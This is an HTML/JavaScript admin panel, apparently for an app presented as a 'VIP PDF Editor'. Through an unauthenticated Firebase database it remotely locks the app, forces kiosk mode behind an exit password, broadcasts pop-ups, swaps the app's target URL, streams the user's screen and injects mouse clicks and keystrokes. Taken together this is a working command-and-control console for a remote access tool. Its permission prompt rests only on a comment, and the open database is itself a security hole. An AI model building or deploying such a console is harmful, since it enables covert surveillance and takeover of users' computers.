<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VIP PDF Editor - Admin Panel</title>
    <style>
        :root {
            --bg-color: #f1f2f6;
            --header-bg: #0984e3;
            --text-color: #2d3436;
            --label-bg: #dfe6e9;
            --border-radius: 6px;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            min-height: 100vh;
        }

        /* --- SCROLLBAR --- */
        ::-webkit-scrollbar {
            width: 10px;
        }
        ::-webkit-scrollbar-track {
            background: #f1f2f6;
        }
        ::-webkit-scrollbar-thumb {
            background: #b2bec3;
            border-radius: 5px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #636e72;
        }

        /* --- LAYOUT --- */
        .container {
            width: 100%;
            max-width: 800px;
            background: var(--bg-color);
            display: flex;
            flex-direction: column;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
        }

        header {
            background-color: var(--header-bg);
            color: white;
            padding: 20px;
            text-align: center;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        header h1 {
            margin: 0;
            font-size: 24px;
            font-weight: bold;
        }

        .content-area {
            padding: 20px;
            overflow-y: auto;
        }

        /* --- SECTIONS (CARD STYLE) --- */
        section {
            background: white;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
            border-top: 4px solid var(--header-bg);
        }

        section h2 {
            margin-top: 0;
            font-size: 16px;
            color: var(--text-color);
            border-bottom: 1px solid #eee;
            padding-bottom: 10px;
            margin-bottom: 15px;
        }

        /* --- FORM ELEMENTS --- */
        .control-group {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
            flex-wrap: wrap;
        }

        .status-display {
            background-color: var(--label-bg);
            padding: 8px 12px;
            border-radius: 4px;
            border: 1px solid #ccc;
            flex-grow: 1;
            font-family: monospace;
            font-weight: bold;
        }

        input[type="text"], input[type="password"] {
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
            flex-grow: 1;
            font-size: 14px;
        }

        /* --- BUTTONS --- */
        button {
            padding: 8px 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            color: white;
            transition: opacity 0.2s;
            font-size: 13px;
        }

        button:hover {
            opacity: 0.9;
        }

        button:disabled {
            background-color: #ccc !important;
            cursor: not-allowed;
        }

        /* Specific Button Colors (Matching Python App) */
        .btn-lock { background-color: #d63031; }
        .btn-unlock { background-color: #00b894; }
        .btn-pattern { background-color: #6c5ce7; }
        .btn-update-url { background-color: #e17055; }
        .btn-alert-send { background-color: #e84393; }
        .btn-alert-update { background-color: #0984e3; }
        .btn-alert-del { background-color: #636e72; }
        .btn-kiosk { background-color: #2d3436; }
        .btn-windowed { background-color: #b2bec3; color: #2d3436; }
        .btn-password { background-color: #0984e3; }
        .btn-screencast { background-color: #6c5ce7; font-size: 15px; padding: 10px 20px; }
        .btn-sc-off { background-color: #636e72; font-size: 15px; padding: 10px 20px; }

        /* --- SCREENCEST VIEWER POPUP --- */
        #screencast-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.85);
            z-index: 1000;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .viewer-container {
            width: 90%;
            height: 80%;
            background-color: black;
            position: relative;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
            border: 2px solid #444;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        #screencast-canvas {
            display: block;
            /* Canvas size is handled by JS, but CSS ensures it fits container */
            max-width: 100%;
            max-height: 100%;
        }

        .viewer-controls {
            margin-top: 15px;
            background: #2d3436;
            padding: 10px;
            border-radius: 8px;
            display: flex;
            gap: 10px;
            align-items: center;
        }

        #interaction-status {
            color: #b2bec3;
            font-size: 14px;
            margin-left: auto;
            margin-right: 10px;
        }
        
        .interactive-active {
            color: #00cec9 !important;
            text-shadow: 0 0 5px rgba(0, 206, 201, 0.5);
        }

        /* Toast Notification */
        #toast {
            visibility: hidden;
            min-width: 250px;
            background-color: #333;
            color: #fff;
            text-align: center;
            border-radius: 4px;
            padding: 16px;
            position: fixed;
            z-index: 2000;
            left: 50%;
            bottom: 30px;
            transform: translateX(-50%);
            font-size: 17px;
        }

        #toast.show {
            visibility: visible;
            animation: fadein 0.5s, fadeout 0.5s 2.5s;
        }

        @keyframes fadein {
            from {bottom: 0; opacity: 0;}
            to {bottom: 30px; opacity: 1;}
        }

        @keyframes fadeout {
            from {bottom: 30px; opacity: 1;}
            to {bottom: 0; opacity: 0;}
        }
    </style>
</head>
<body>

    <!-- MAIN ADMIN PANEL -->
    <div class="container">
        <header>
            <h1>Administrator Control Panel</h1>
        </header>

        <div class="content-area">
            
            <!-- 1. App Status Control -->
            <section>
                <h2>App Status Control</h2>
                <div class="control-group">
                    <span>Current Status:</span>
                    <div id="lbl-status" class="status-display" style="color: white; background-color: #ccc;">Checking...</div>
                </div>
                <div class="control-group">
                    <button class="btn-lock" onclick="setAppStatus(true)">LOCK APP</button>
                    <button class="btn-unlock" onclick="setAppStatus(false)">UNLOCK APP</button>
                </div>
            </section>

            <!-- 2. Security Pattern -->
            <section>
                <h2>Security Pattern</h2>
                <div class="control-group">
                    <span>Current Pattern:</span>
                    <div id="lbl-pattern" class="status-display">Fetching...</div>
                </div>
                <div class="control-group">
                    <button class="btn-pattern" onclick="showToast('Pattern builder logic would go here.')">CHANGE PATTERN</button>
                </div>
            </section>

            <!-- 3. App Configuration (URL) -->
            <section>
                <h2>App Configuration (Live URL)</h2>
                <div class="control-group">
                    <span>Target App URL:</span>
                </div>
                <div class="control-group">
                    <input type="text" id="entry-url" placeholder="https://...">
                </div>
                <div class="control-group">
                    <button class="btn-update-url" onclick="updateUrl()">UPDATE URL</button>
                </div>
            </section>

            <!-- 4. Message Alert System -->
            <section>
                <h2>Message Alert System</h2>
                <div class="control-group">
                    <span>Send a popup message to all users:</span>
                </div>
                <div class="control-group">
                    <input type="text" id="entry-alert" placeholder="Enter alert message...">
                </div>
                <div class="control-group">
                    <button class="btn-alert-send" onclick="sendAlert(true)">SEND ALERT</button>
                    <button class="btn-alert-update" onclick="sendAlert(false)">UPDATE</button>
                    <button class="btn-alert-del" onclick="deleteAlert()">DELETE</button>
                </div>
            </section>

            <!-- 5. Window Locking System -->
            <section>
                <h2>Window Locking System</h2>
                <div class="control-group">
                    <div id="lbl-win-lock" class="status-display" style="background:none; border:none;">Current: Checking...</div>
                </div>
                <div class="control-group">
                    <button class="btn-kiosk" onclick="setWindowLock(true)">FORCE KIOSK MODE</button>
                    <button class="btn-windowed" onclick="setWindowLock(false)">ALLOW WINDOWED</button>
                </div>
            </section>

            <!-- 6. Window Password -->
            <section>
                <h2>Window Password (Exit Code)</h2>
                <div class="control-group">
                    <span>Password required to minimize/close app in Kiosk Mode:</span>
                </div>
                <div class="control-group">
                    <input type="password" id="entry-pass" placeholder="******">
                </div>
                <div class="control-group">
                    <button class="btn-password" onclick="setPassword()">SET PASSWORD</button>
                    <button class="btn-alert-del" onclick="setPassword('')">DISABLE</button>
                </div>
            </section>

            <!-- 7. Remote Screencast Control -->
            <section>
                <h2>Remote Screencast Control</h2>
                <p style="color: #636e72; font-size: 13px; margin-top:0;">View the user's screen and control their mouse & keyboard.</p>
                <div class="control-group">
                    <button class="btn-screencast" onclick="requestScreencast()">REQUEST SCREENCEST</button>
                    <button class="btn-sc-off" onclick="offScreencast()">OFF FUNCTION</button>
                </div>
            </section>

            <div style="text-align: center; color: #b2bec3; margin-bottom: 20px; font-size: 12px;">
                Ensure you have a stable internet connection.
            </div>

        </div>
    </div>

    <!-- SCREENCEST POPUP MODAL -->
    <div id="screencast-modal">
        <div class="viewer-container" id="viewer-container">
            <canvas id="screencast-canvas"></canvas>
        </div>
        
        <div class="viewer-controls">
            <button class="btn-lock" onclick="stopViewer()">STOP VIEWING</button>
            <button class="btn-sc-off" onclick="offScreencast()">OFF FUNCTION</button>
            
            <div style="width: 20px;"></div> <!-- Spacer -->
            
            <button id="btn-interactive" class="btn-screencast" style="background-color: #0984e3; font-size: 13px;" onclick="toggleInteractive()">ENABLE INTERACTIVE</button>
            <span id="interaction-status">MODE: VIEW ONLY</span>
        </div>
    </div>

    <!-- TOAST NOTIFICATION -->
    <div id="toast">Message</div>
    <!-- JAVASCRIPT LOGIC -->
       <!-- JAVASCRIPT LOGIC -->
    <script>
        // --- CONFIGURATION ---
        const FIREBASE_DB_URL = "https://vipteammod-movies-default-rtdb.firebaseio.com";
        
        // --- PATHS ---
        const APP_STATUS_PATH = "app_status/is_locked";
        const PATTERN_PATH = "app_status/pattern_config";
        const APP_URL_PATH = "app_config/app_url";
        const ALERT_MSG_PATH = "app_controls/alert_message";
        const WINDOW_PASSWORD_PATH = "app_controls/window_password";
        const WINDOW_LOCKED_PATH = "app_controls/window_locked";

        const SCREENCAST_REQUEST_PATH = "app_controls2/screencast_request2";
        const SCREENCAST_DATA_PATH = "app_controls2/screencast_data2";
        const SCREENCAST_COMMAND_PATH = "app_controls2/screencast_command2";

        // --- STATE VARIABLES ---
        let isViewerRunning = false;
        let isInteractiveMode = false;
        let lastImageHash = "";
        let viewerInterval = null;
        let uiRefreshInterval = null;

        // --- DOM ELEMENTS ---
        const modal = document.getElementById('screencast-modal');
        const canvas = document.getElementById('screencast-canvas');
        const ctx = canvas.getContext('2d');
        const interactionBtn = document.getElementById('btn-interactive');
        const interactionStatus = document.getElementById('interaction-status');

        // --- FIREBASE HELPERS ---
        async function sendFirebasePut(path, data) {
            const url = `${FIREBASE_DB_URL}/${path}.json`;
            try {
                const response = await fetch(url, {
                    method: 'PUT',
                    body: JSON.stringify(data)
                });
                if (!response.ok) throw new Error('Network response was not ok');
            } catch (error) {
                console.error("Firebase Put Error:", error);
                showToast("Connection Error: " + error.message);
                throw error;
            }
        }

        async function getFirebaseData(path) {
            const url = `${FIREBASE_DB_URL}/${path}.json`;
            try {
                const response = await fetch(url);
                if (!response.ok) return null;
                return await response.json();
            } catch (error) {
                console.error("Firebase Get Error:", error);
                return null;
            }
        }

        // --- UI FEEDBACK ---
        function showToast(message) {
            const x = document.getElementById("toast");
            x.textContent = message;
            x.className = "show";
            setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
        }

        // --- ADMIN PANEL FUNCTIONS ---

        function setAppStatus(locked) {
            const msg = locked ? "Lock application?" : "Unlock application?";
            if(confirm(msg)) {
                sendFirebasePut(APP_STATUS_PATH, locked)
                    .then(() => {
                        showToast(locked ? "APP LOCKED" : "APP UNLOCKED");
                        refreshStatus();
                    })
                    .catch(() => showToast("Error updating status"));
            }
        }

        function updateUrl() {
            const input = document.getElementById('entry-url');
            const url = input.value.trim();
            if (!url.startsWith("http")) {
                showToast("Error: Must start with http");
                return;
            }
            if(confirm(`Set URL to:\n${url}?`)) {
                sendFirebasePut(APP_URL_PATH, url)
                    .then(() => {
                        showToast("URL Updated");
                        refreshStatus();
                    })
                    .catch(() => showToast("Error updating URL"));
            }
        }

        function sendAlert(isBroadcast) {
            const input = document.getElementById('entry-alert');
            const msg = input.value.trim();
            if (!msg) return showToast("Please enter a message.");
            
            const confirmText = isBroadcast ? `Broadcast Alert:\n\n'${msg}'?` : `Update message to:\n\n'${msg}'?`;
            if(confirm(confirmText)) {
                sendFirebasePut(ALERT_MSG_PATH, msg)
                    .then(() => showToast(isBroadcast ? "Alert Sent!" : "Message Updated"))
                    .catch(() => showToast("Error sending alert"));
            }
        }

        function deleteAlert() {
            if(confirm("Clear alert message?")) {
                sendFirebasePut(ALERT_MSG_PATH, "")
                    .then(() => {
                        document.getElementById('entry-alert').value = "";
                        showToast("Alert Deleted");
                    })
                    .catch(() => showToast("Error deleting alert"));
            }
        }

        function setWindowLock(locked) {
            sendFirebasePut(WINDOW_LOCKED_PATH, locked)
                .then(() => refreshStatus())
                .catch(() => showToast("Error updating window lock"));
        }

        function setPassword() {
            const input = document.getElementById('entry-pass');
            let pwd = input.value.trim();
            
            if (pwd === "******") {
                input.value = "";
                input.focus();
                showToast("Type NEW password.");
                return;
            }

            if (confirm(`Set password:\n${pwd ? pwd : 'DISABLE PASSWORD'}?`)) {
                sendFirebasePut(WINDOW_PASSWORD_PATH, pwd)
                    .then(() => {
                        if (pwd) {
                            input.value = "******";
                            showToast("Password Enabled");
                        } else {
                            input.value = "";
                            showToast("Password Disabled");
                        }
                    })
                    .catch(() => showToast("Error setting password"));
            }
        }

        // --- AUTO REFRESH LOGIC ---
        async function refreshStatus() {
            try {
                const isLocked = await getFirebaseData(APP_STATUS_PATH);
                const lblStatus = document.getElementById('lbl-status');
                if (isLocked) {
                    lblStatus.textContent = " LOCKED ";
                    lblStatus.style.backgroundColor = "#d63031";
                } else {
                    lblStatus.textContent = " UNLOCKED ";
                    lblStatus.style.backgroundColor = "#00b894";
                }

                const pattern = await getFirebaseData(PATTERN_PATH);
                document.getElementById('lbl-pattern').textContent = pattern ? pattern : "Default (0,1,2,5,8)";

                const urlInput = document.getElementById('entry-url');
                if (document.activeElement !== urlInput) {
                    const currentUrl = await getFirebaseData(APP_URL_PATH);
                    if (currentUrl && urlInput.value !== currentUrl) urlInput.value = currentUrl;
                }

                const alertInput = document.getElementById('entry-alert');
                if (document.activeElement !== alertInput) {
                    const currentAlert = await getFirebaseData(ALERT_MSG_PATH);
                    if (currentAlert && alertInput.value !== currentAlert) alertInput.value = currentAlert;
                }

                const wLocked = await getFirebaseData(WINDOW_LOCKED_PATH);
                document.getElementById('lbl-win-lock').textContent = `Current: ${wLocked ? "Locked (Kiosk Mode)" : "Windowed (Unlocked)"}`;

                const passInput = document.getElementById('entry-pass');
                if (document.activeElement !== passInput) {
                    const currentPass = await getFirebaseData(WINDOW_PASSWORD_PATH);
                    if (currentPass && currentPass !== "" && passInput.value !== "******") {
                        passInput.value = "******";
                    } else if (!currentPass && passInput.value !== "") {
                        passInput.value = "";
                    }
                }

            } catch (e) {
                console.error("Refresh Error", e);
            }
        }

        // --- SCREENCEST VIEWER LOGIC ---

        function requestScreencast() {
            if(confirm("Request to view user's screen?\n(The user will be asked for permission)")) {
                sendFirebasePut(SCREENCAST_REQUEST_PATH, true)
                    .then(() => {
                        showToast("Request Sent: Waiting for user permission...");
                        startViewer();
                    })
                    .catch(() => showToast("Error requesting screencast"));
            }
        }

        function offScreencast() {
            sendFirebasePut(SCREENCAST_REQUEST_PATH, false)
                .then(() => {
                    showToast("Screencast function turned OFF.");
                    stopViewer();
                })
                .catch(() => showToast("Error turning off screencast"));
        }

        function startViewer() {
            if (isViewerRunning) return;
            modal.style.display = 'flex';
            isViewerRunning = true;
            isInteractiveMode = false;
            resetInteractiveUI();
            viewerLoop();
        }

        function stopViewer() {
            isViewerRunning = false;
            modal.style.display = 'none';
        }

        function toggleInteractive() {
            isInteractiveMode = !isInteractiveMode;
            if (isInteractiveMode) {
                interactionBtn.textContent = "DISABLE INTERACTIVE";
                interactionBtn.style.backgroundColor = "#d63031";
                interactionStatus.textContent = "MODE: REMOTE CONTROL ACTIVE (1 Click = 5 Clicks)";
                interactionStatus.classList.add('interactive-active');
                showToast("Interactive Mode Enabled. 1 Click = 5 Clicks Trigger.");
                modal.focus(); 
            } else {
                resetInteractiveUI();
            }
        }

        function resetInteractiveUI() {
            interactionBtn.textContent = "ENABLE INTERACTIVE";
            interactionBtn.style.backgroundColor = "#0984e3";
            interactionStatus.textContent = "MODE: VIEW ONLY";
            interactionStatus.classList.remove('interactive-active');
        }

        // --- NETWORK & DRAWING LOOP ---
        async function viewerLoop() {
            if (!isViewerRunning) return;

            try {
                const data = await getFirebaseData(SCREENCAST_DATA_PATH);
                if (data && typeof data === 'string' && data.length > 500) {
                    if (data !== lastImageHash) {
                        lastImageHash = data;
                        drawImageFromBase64(data);
                    }
                }
            } catch (e) {
                console.error("Stream error:", e);
            }

            setTimeout(viewerLoop, 100);
        }

        function drawImageFromBase64(b64String) {
            const img = new Image();
            img.onload = function() {
                const container = document.getElementById('viewer-container');
                const maxWidth = container.clientWidth;
                const maxHeight = container.clientHeight;

                let width = img.width;
                let height = img.height;
                const ratio = Math.min(maxWidth / width, maxHeight / height);
                const canvasWidth = width * ratio;
                const canvasHeight = height * ratio;

                canvas.width = canvasWidth;
                canvas.height = canvasHeight;
                ctx.drawImage(img, 0, 0, canvasWidth, canvasHeight);
            };
            img.src = "data:image/png;base64," + b64String;
        }

        // --- INTERACTION CONTROLS (UPDATED FOR 5x CLICK) ---

        async function sendCommand(cmdObj) {
            if (!isInteractiveMode) return;
            try {
                await sendFirebasePut(SCREENCAST_COMMAND_PATH, cmdObj);
                // Note: We do NOT clear the command immediately here if we are spamming clicks, 
                // but usually Firebase async/await handles the queue. 
                // For safety with rapid fire, we rely on the Python script to consume the latest value.
                // However, to ensure 5 distinct events, we await each.
                await sendFirebasePut(SCREENCAST_COMMAND_PATH, null); 
            } catch (e) {
                console.error(">>> Failed command:", e);
            }
        }

        canvas.addEventListener('mouseup', async function(e) {
            if (!isInteractiveMode) return;
            e.preventDefault();

            const rect = canvas.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            const x_pct = parseFloat((x / rect.width).toFixed(4));
            const y_pct = parseFloat((y / rect.height).toFixed(4));

            showToast("Sending 5 Clicks...");

            // Loop to send 5 clicks rapidly
            for (let i = 0; i < 5; i++) {
                await sendCommand({
                    action: "click",
                    x_pct: x_pct,
                    y_pct: y_pct
                });
                // Optional: Small delay to prevent flooding Firebase too fast
                // await new Promise(r => setTimeout(r, 20)); 
            }
        });

        window.addEventListener('keydown', async function(e) {
            if (!isViewerRunning || !isInteractiveMode) return;

            let keyName = e.key;

            const mapping = {
                'Enter': 'enter', ' ': 'space', 'Backspace': 'backspace', 'Tab': 'tab',
                'Shift': 'shift', 'Control': 'ctrl', 'Alt': 'alt', 'Escape': 'esc',
                'Delete': 'delete', 'Insert': 'insert', 'Home': 'home', 'End': 'end',
                'ArrowUp': 'up', 'ArrowDown': 'down', 'ArrowLeft': 'left', 'ArrowRight': 'right'
            };

            if (mapping[keyName]) {
                keyName = mapping[keyName];
            } else if (keyName.length === 1) {
                keyName = keyName.toLowerCase();
            }

            e.preventDefault();
            await sendCommand({ action: "type", key: keyName });
        });

        // --- INITIALIZATION ---
        setInterval(refreshStatus, 5000);
        refreshStatus();

    </script>
</body>
</html>
